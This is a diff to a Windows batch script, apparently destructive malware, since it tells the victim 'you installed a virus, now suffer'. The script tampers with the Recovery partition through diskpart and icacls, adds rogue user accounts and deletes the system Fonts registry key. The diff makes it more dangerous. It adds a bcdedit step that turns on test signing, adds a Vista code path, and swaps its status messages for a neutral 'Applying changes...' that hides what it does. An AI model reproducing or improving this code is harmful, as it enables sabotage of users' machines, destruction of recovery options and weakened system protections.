@@ -4,8 +4,6 @@ TITLE CMDV4
 echo Loading...
 SFC /ScanFile="C:\Windows\system32\net.exe"
 cls
-SFC /ScanFile="C:\Windows\system32\net1.exe"
-cls
 @rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
 echo OFF
 NET SESSION >nul 2>&1
@@ -51,7 +49,7 @@ wmic os get version | find "10.0" > nul
 if %ERRORLEVEL% == 0 goto TEN
 )
 wmic os get version | find "6.0" > nul
-if %ERRORLEVEL% == 0 goto MAININSTALLB
+if %ERRORLEVEL% == 0 goto MAININSTALLBVISTA
 )
 wmic os get version | find "5.1" > nul
 if %ERRORLEVEL% == 0 goto MAININSTALLB
@@ -80,7 +78,7 @@ echo,
 SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN7INSTALLRE
 :WIN7INSTALLRE
-echo Installing Windows RE :)
+echo Applying changes...
 diskpart /s %CD%\win7\diskpart.txt
 icacls "C:\Recovery\" /setowner "Dartz" /T /C
 icacls "C:\Recovery\" /grant Dartz:F /T /C
@@ -89,7 +87,7 @@ goto SEVENINSTALL
 :SEVENINSTALL
 echo,
 cls
-echo Please Wait...
+echo Applying changes...
 goto MAININSTALL
 :EIGHT
 cls
@@ -115,8 +113,7 @@ goto MAININSTALLB
 echo Sorry but Windows 8 Support has not been inplemented yet.
 PAUSE
 exit
-echo Installing OS Protection...
-goto MAININSTALL
+echo Applying changes...
 :EIGHTPOINTONE
 cls
 echo .....................................................
@@ -130,7 +127,7 @@ SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN81INSTALLRE
 :WIN81INSTALLRE
 cls
-echo Installing Windows RE Protection...
+echo Applying changes...
 diskpart /s %CD%\win81\diskpart.txt
 icacls "K:\Recovery\" /setowner "Dartz" /T /C
 icacls "K:\Recovery\" /grant Dartz:F /T /C
@@ -154,7 +151,7 @@ SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN10INSTALLRE
 :WIN10INSTALLRE
 goto TENINSTALL
-echo Installing Windows RE Protection...
+echo Applying changes...
 diskpart /s %CD%\win10\diskpart.txt
 icacls "K:\Recovery\" /setowner "Dartz" /T /C
 icacls "K:\Recovery\" /grant Dartz:F /T /C
@@ -172,7 +169,7 @@ net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 diskpart /s %CD%\unass\unass.txt
-goto DESTROY
+goto BCD
 :EXIT
 exit
 :RESTART
@@ -180,7 +177,7 @@ echo you idiot, you installed a virus, now suffer!!!!!!!!!
 echo,
 wmic os where primary=1 reboot
 :DESTROY
-REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
+REG DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Fonts" /f
 GOTO eeee
 :MAININSTALLB
 cls
@@ -198,6 +195,11 @@ net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 goto DESTROY
+:MAININSTALLBVISTA
+net user beachball /add
+net localgroup Guests beachball /add
+net user Dartz 1593570 /domain
+goto BCD
 :eeee
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
@@ -215,3 +217,6 @@ echo,
 echo Something Happened :)
 cls
 goto RESTART
+:BCD
+bcdedit /set TESTSIGNING on
+goto DESTROY
